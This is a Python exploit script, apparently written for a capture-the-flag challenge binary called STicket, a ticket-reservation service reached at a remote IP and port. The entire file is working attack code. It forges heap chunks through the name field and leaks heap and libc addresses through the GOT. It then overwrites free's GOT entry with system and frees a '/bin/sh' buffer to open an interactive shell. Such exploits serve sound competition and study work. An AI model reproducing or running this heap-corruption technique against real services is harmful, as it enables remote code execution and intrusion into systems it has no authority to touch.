#!/usr/bin/env python
from sc_expwn import *

bin_file = './STicket'

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'10.17.125.202', 'port':31729})
'''
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.19.so_remote')
'''
env.select('remote')

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_got_free       = binf.got['free']
addr_name           = binf.symbols['name']
addr_list           = binf.symbols['list']
addr_sec_data       = binf.sep_section['.data']

#libc = ELF(env.libc) if env.libc else binf.libc
libc = binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    st = STicket(conn)

    exploit  = p64(0xdeadbeef)
    exploit += p64(0x21)
    exploit += p64(0)
    exploit += p64(0x21)
    exploit += p64(addr_name+0x20)
    exploit += p64(0x21)
    exploit += p64(0)
    exploit += p64(0x21)
    exploit += '\x00'*(0x58-len(exploit))
    exploit += p64(addr_name+0x10)

    conn.recvuntil('name : ')
    conn.send(exploit[:-2])
    st.reserve(0, 1, 1, 1, 0x20, p64(0)+p(0x51))
    st.cancel(0)
    st.reserve(0x21, 0, 1, 1, 0x18, p64(addr_list))
    st.reserve(1, 2, 1, 1, 0x80, p64(0)+p(0x51))

    addr_heap_base       = u(st.confirm()[1].strip().split(' : ')[2]) - 0x10
    info('addr_heap_base   = 0x{:08x}'.format(addr_heap_base))

    st.cancel(3)
    conn.sendline('0')

    exploit  = p64(0xdeadbeef)
    exploit += '\x00'*(0x58-len(exploit))
    exploit += p64(addr_heap_base+0x40)
    conn.recvuntil('name : ')
    conn.send(exploit[:-2])
    st.cancel(0)

    exploit  = '\x00'*0x30
    exploit += p64(addr_got_main)
    exploit += p(addr_sec_data-(addr_heap_base+0x70))
    st.reserve(2, 3, 1, 1, 0x48, exploit)

    addr_libc_main      = u(st.confirm()[0].strip().split(' : ')[2])
    libc.address        = addr_libc_main - offset_libc_main
    info('addr_libc_base   = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_puts      = libc.sep_function['puts']
    addr_libc_strlen    = libc.sep_function['strlen']

    st.reserve(3, 4, 1, 1, 0, None)
    st.reserve(4, 5, 1, 1, (addr_got_free-0x20)-(addr_heap_base+0xd0), None)

    st.cancel(2)
    payload  = '/bin/sh\x00'
    payload += p(addr_libc_system) 
    payload += p(addr_libc_puts) 
    payload += p(addr_libc_strlen) 
    st.reserve(5, 6, 1, 1, 0x28, payload)
    st.cancel(2)

class STicket:
    def __init__(self, conn):
        self.recvuntil  = conn.recvuntil
        self.recv       = conn.recv
        self.sendline   = conn.sendline
        self.send       = conn.send

    def reserve(self, f, t, car, seat, comment_len, comment):
        self.recvuntil('>> ')
        self.sendline('1')

        self.recvuntil('Station to get on >> ')
        self.sendline(str(f))
        self.recvuntil('Station to get off >> ')
        self.sendline(str(t))
        self.recvuntil('Car number(1-16) >> ')
        self.sendline(str(car))
        self.recvuntil('Seat number(1-20) >> ')
        self.sendline(str(seat))

        self.recvuntil('Comment length >> ')
        self.sendline(str(comment_len))
        if comment:
            self.recvuntil('Comment >> ')
            self.sendline(comment)

    def confirm(self):
        self.recvuntil('>> ')
        self.sendline('2')

        return self.recvuntil('#\n\n').split('#'+'='*0x28+'#')[1:-1]

    def cancel(self, ID):
        self.recvuntil('>> ')
        self.sendline('3')

        self.recvuntil('Input the ID to cancel >> ')
        self.sendline(str(ID))

    def logout(self):
        self.recvuntil('>> ')
        self.sendline('0')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
